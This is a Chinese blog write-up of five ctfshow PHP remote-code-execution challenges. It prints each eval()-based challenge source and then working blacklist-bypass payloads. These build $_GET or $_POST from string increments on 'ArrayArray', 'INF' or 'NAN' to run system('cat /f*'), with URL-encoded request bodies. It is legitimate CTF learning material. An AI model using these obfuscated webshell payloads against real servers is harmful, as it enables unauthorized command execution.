<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>每周大挑战-RCE - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="每周大挑战-RCE - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2023/03/02/%E6%AF%8F%E5%91%A8%E5%A4%A7%E6%8C%91%E6%88%98%E2%80%94%E2%80%94RCE/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-03-02T10:29:42.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/WriteUp/">WriteUp</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>March</span>
            <span>2,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">每周大挑战-RCE</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h2 id="启语"><a href="#启语" class="headerlink" title="启语"></a>启语</h2><p>是Ctfshow官网主办的一个活动，看起来题目就觉得很新，所以就来尝试尝试了，（还有奖金），之后都会参加的，再接再厉吧！</p>
<h2 id="RCE挑战1"><a href="#RCE挑战1" class="headerlink" title="RCE挑战1"></a>RCE挑战1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;(&quot;</span>,<span class="string">&quot;括号&quot;</span>,<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;点&quot;</span>,<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>dinner都会，payload：<br><code>code=echo </code>cat &#x2F;f*<code>;</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668879399090-645a2da2-9b2a-4487-b4d3-7706a50c0724.png#averageHue=%23868685&clientId=u912a32d0-9851-4&from=paste&height=462&id=ub8ffece9&name=image.png&originHeight=577&originWidth=1186&originalType=binary&ratio=1&rotation=0&showTitle=false&size=40646&status=done&style=none&taskId=u4ff83458-3e60-461d-b215-d016572ab75&title=&width=948.8" alt="image.png"></p>
<h2 id="RCE挑战2"><a href="#RCE挑战2" class="headerlink" title="RCE挑战2"></a>RCE挑战2</h2><p>真没想到这种题我一开始居然放弃了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>一个简简单单，有手就行的自增，分析如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[].[]; <span class="comment">//俩数组拼接强行返回ArrayArray,这里一个短杠的值也就是ArrayArray</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;&#x27;</span>;  <span class="comment">//两个短杠赋值为空</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;&#x27;</span>];<span class="comment">//从arrayarray中取首字符，即a。这里$_=$_[0]也是一样的道理，不过waf限制数字输入</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//b</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//c</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//d</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//e</span></span><br><span class="line"><span class="variable">$__</span>.=<span class="variable">$_</span>; <span class="comment">//E  把两个短杠赋值为E</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//F  一个短杠继续自增</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//G </span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$__</span>; <span class="comment">// GE  一个短杠自增变成了G，两个短杠在前面第十一行处已经赋值为E，拼接得GE</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//H 此处一个短杠继续自增，为H</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//I</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//J</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//k</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//L</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//M</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//N</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//O</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//P</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//Q</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//R</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//S</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$_</span>; <span class="comment">//T</span></span><br><span class="line"><span class="variable">$__</span>.=<span class="variable">$_</span>; <span class="comment">// GET 在此处，两条短杠原是GE与一条短杠（已经自增为T），.=拼接，构成get</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.<span class="variable">$__</span>; <span class="comment">//_GET</span></span><br><span class="line"><span class="variable">$$__</span>[<span class="string">&#x27;_&#x27;</span>](<span class="variable">$$__</span>[<span class="string">&#x27;__&#x27;</span>]); <span class="comment">// 进行拼接，$_GET[&#x27;_&#x27;]($_GET[&#x27;__&#x27;]);</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668879608893-909eb446-95c9-425a-a700-b0de53be4600.png#averageHue=%236e6e6e&clientId=u728baa37-20e7-4&from=paste&height=545&id=u886203d2&name=image.png&originHeight=681&originWidth=1233&originalType=binary&ratio=1&rotation=0&showTitle=false&size=80825&status=done&style=none&taskId=uac92b767-a990-4ba0-b7d0-f66957a14de&title=&width=986.4" alt="image.png"><br>记得URL编码哦</p>
<h2 id="RCE挑战3"><a href="#RCE挑战3" class="headerlink" title="RCE挑战3"></a>RCE挑战3</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">105</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z2-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>与上一题相比多了长度限制，然后看看可用字符有什么不同呢？</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#$ ( ) + , . / 0 1 ; = [ ] _</span><br><span class="line">#! $ &#x27; ( ) + , . / ; = [ ] _ </span><br></pre></td></tr></table></figure>
<p>这一轮单引号没了，与之对应的有了0和1,有了这两个我就可以构造字符串”INF”无穷大，得到3个可用字符，接下来就是构造payload了<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668954565380-9891151a-7276-4f69-8467-61043a90bfc4.png#averageHue=%23fdfdfc&clientId=ue36a2ab5-6222-4&from=paste&height=334&id=udd8b8c1b&name=image.png&originHeight=418&originWidth=1860&originalType=binary&ratio=1&rotation=0&showTitle=false&size=83547&status=done&style=none&taskId=u73251a04-e194-424b-9870-8d38fe8fa27&title=&width=1488" alt="image.png"><br>最后的payload是：<br><code>0=system&amp;1=cat+%2Ff*&amp;ctf_show=%24_%3D%28%281%2F0%29._%29%5B1%5D%3B%24_%3D%2B%2B%24_%3B%24__%3D%24_.%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24__.%3D%2B%2B%24_%3B%24__.%3D%2B%2B%24_%3B%24__%3D_.%24__%3B%24%24__%5B0%5D%28%24%24__%5B1%5D%29%3B</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668954581848-d019cffe-02bd-4eea-8fc8-87c8c6ff3286.png#averageHue=%23747474&clientId=ue36a2ab5-6222-4&from=paste&height=489&id=ub1e49cff&name=image.png&originHeight=611&originWidth=1675&originalType=binary&ratio=1&rotation=0&showTitle=false&size=67211&status=done&style=none&taskId=udafaa245-7d9d-4911-92cd-123e0171328&title=&width=1340" alt="image.png"></p>
<h2 id="RCE挑战4"><a href="#RCE挑战4" class="headerlink" title="RCE挑战4"></a>RCE挑战4</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">84</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z1-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>源码变了一丢丢，和上一题相比少了个1<br>照样还是可以得到N的：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=(_/_._)[<span class="number">0</span>]; <span class="comment">#N</span></span><br><span class="line"><span class="variable">$a</span>=++<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$a</span>=++<span class="variable">$_</span>.<span class="variable">$a</span>; <span class="comment">//PO</span></span><br><span class="line"><span class="variable">$_</span>++; <span class="comment">//Q</span></span><br><span class="line"><span class="variable">$_</span>++; <span class="comment">//R</span></span><br><span class="line"><span class="variable">$a</span>.=++<span class="variable">$_</span>; <span class="comment">//POS</span></span><br><span class="line"><span class="variable">$a</span>.=++<span class="variable">$_</span>; POST</span><br><span class="line"><span class="variable">$a</span>=_.<span class="variable">$a</span>; <span class="comment">//_POST</span></span><br><span class="line"><span class="variable">$$a</span>[<span class="number">0</span>](<span class="variable">$$a</span>[_]);</span><br><span class="line"><span class="variable">$_</span>=(_/_._)[<span class="number">0</span>];<span class="variable">$a</span>=++<span class="variable">$_</span>;<span class="variable">$a</span>=++<span class="variable">$_</span>.<span class="variable">$a</span>;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$a</span>.=++<span class="variable">$_</span>;<span class="variable">$a</span>.=++<span class="variable">$_</span>;<span class="variable">$a</span>=_.<span class="variable">$a</span>;<span class="variable">$$a</span>[<span class="number">0</span>](<span class="variable">$$a</span>[_]);</span><br><span class="line"></span><br><span class="line">ctf_show=%<span class="number">24</span>_%<span class="number">3</span>D(_%<span class="number">2</span>F_._)%<span class="number">5</span>B0%<span class="number">5</span>D%<span class="number">3</span>B%<span class="number">24</span>%ff%<span class="number">3</span>D%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>%ff%<span class="number">3</span>D%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>_.%<span class="number">24</span>%ff%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%ff.%<span class="number">3</span>D%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>%ff.%<span class="number">3</span>D%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">24</span>_%<span class="number">3</span>B%<span class="number">24</span>%ff%<span class="number">3</span>D_.%<span class="number">24</span>%ff%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">24</span>%ff%<span class="number">5</span>B0%<span class="number">5</span>D(%<span class="number">24</span>%<span class="number">24</span>%ff%<span class="number">5</span>B_%<span class="number">5</span>D)%<span class="number">3</span>B&amp;<span class="number">0</span>=system&amp;_=cat /f*</span><br></pre></td></tr></table></figure>
<p>代码里的a只是为了图个方便，我们最后把他换为不可见字符(这个思路感觉不戳啊！）<br>最后也能rce的：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668956138542-a440e184-34b9-43f6-8936-87091e7abb6c.png#averageHue=%23f4edea&clientId=u085de439-cdff-4&from=paste&height=238&id=u9424f810&name=image.png&originHeight=297&originWidth=1226&originalType=binary&ratio=1&rotation=0&showTitle=false&size=55150&status=done&style=none&taskId=ue9d70084-f754-4580-8bc4-768ddf69781&title=&width=980.8" alt="image.png"><br>并且长度就是极限84</p>
<h2 id="RCE挑战5"><a href="#RCE挑战5" class="headerlink" title="RCE挑战5"></a>RCE挑战5</h2><p>最终挑战了属于是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">73</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这次更加过分,限制73，然后可用字符比上一把少个0，也就是<br><code>$ ( ) + , . / ; = [ ] _ </code><br>我们该咋去RCE呢，我极限是74，看了wp之后我真的是操蛋了，我的：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=(_/_._)[_]; <span class="comment">#N</span></span><br><span class="line"><span class="variable">$a</span>=++<span class="variable">$_</span>; <span class="comment">//0</span></span><br><span class="line"><span class="variable">$a</span>=_.++<span class="variable">$_</span>.<span class="variable">$a</span>; <span class="comment">//_PO</span></span><br><span class="line"><span class="variable">$_</span>++; <span class="comment">//Q</span></span><br><span class="line"><span class="variable">$_</span>++; <span class="comment">//R</span></span><br><span class="line"><span class="variable">$a</span>.=++<span class="variable">$_</span>.++<span class="variable">$_</span>; <span class="comment">//_POST</span></span><br><span class="line"><span class="variable">$$a</span>[b](<span class="variable">$$a</span>[c]);</span><br></pre></td></tr></table></figure>
<p>WP的：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=<span class="title function_ invoke__">_</span>(_/_)[_]; <span class="comment">#N</span></span><br><span class="line"><span class="variable">$a</span>=++<span class="variable">$_</span>; <span class="comment">//0</span></span><br><span class="line"><span class="variable">$a</span>=_.++<span class="variable">$_</span>.<span class="variable">$a</span>; <span class="comment">//_PO</span></span><br><span class="line"><span class="variable">$_</span>++; <span class="comment">//Q</span></span><br><span class="line"><span class="variable">$_</span>++; <span class="comment">//R</span></span><br><span class="line"><span class="variable">$a</span>.=++<span class="variable">$_</span>.++<span class="variable">$_</span>; <span class="comment">//_POST</span></span><br><span class="line"><span class="variable">$$a</span>[b](<span class="variable">$$a</span>[c]);</span><br></pre></td></tr></table></figure>
<p>奶奶的，这里我猜到了，但是我不知道怎么用php的拓展gettext<br><code>_(_/_)[_];</code>也就是<code>gettext(_/_)[0]</code>也就得到了N<br>就差这一个字符，可恶啊啊啊啊<br><code>ctf_show=%24_%3D_(_%2F_)%5B_%5D%3B%24%ff%3D%2B%2B%24_%3B%24%ff%3D_.%2B%2B%24_.%24%ff%3B%24_%2B%2B%3B%24_%2B%2B%3B%24%ff.%3D%2B%2B%24_.%2B%2B%24_%3B%24%24%ff%5B_%5D(%24%24%ff%5B%fd%5D)%3B&amp;_=system&amp;%fd=cat /f*</code><br>最后把a,b,c换为不可见字符就好了<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668958451764-1d69796b-5793-4664-a537-b778ac3590fc.png#averageHue=%23f5eeeb&clientId=uc843fd91-cf30-4&from=paste&height=257&id=uf6545eeb&name=image.png&originHeight=321&originWidth=1234&originalType=binary&ratio=1&rotation=0&showTitle=false&size=63636&status=done&style=none&taskId=ua5b4e9e5-d3dd-4a4a-a18d-2219285bb13&title=&width=987.2" alt="image.png"></p>
<h3 id="群友的逆天非预期"><a href="#群友的逆天非预期" class="headerlink" title="群友的逆天非预期"></a>群友的逆天非预期</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=<span class="title function_ invoke__">_</span>(_/_)[_]; <span class="comment">//N</span></span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>=_.(<span class="variable">$_</span>.<span class="variable">$_</span>++).<span class="variable">$_</span>[++<span class="variable">$_</span>.++<span class="variable">$_</span>.++<span class="variable">$_</span>].++<span class="variable">$_</span>;<span class="comment">//POST</span></span><br></pre></td></tr></table></figure>
